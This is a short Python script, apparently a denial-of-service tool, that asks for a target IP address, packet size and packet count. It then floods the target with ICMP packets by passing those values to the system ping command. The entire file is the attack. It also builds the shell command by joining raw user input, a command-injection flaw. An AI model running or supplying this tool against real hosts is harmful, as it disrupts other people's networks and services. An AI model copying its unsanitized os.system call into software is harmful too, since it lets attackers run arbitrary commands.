import os
import sys 
import time
def icmp_startattack():

    hostip = input("Enter target system's ip address: ")
  
    ippacketData = input("Enter the size of each of the ip packet: ")
    number = input("Enter the number of packets to sent: ")
    print ("Attacking the target with crafted icmp packets")
    os.system("ping " + hostip + " -l " + ippacketData + " -n " + number)
	
icmp_startattack() 

print ("Attack finished")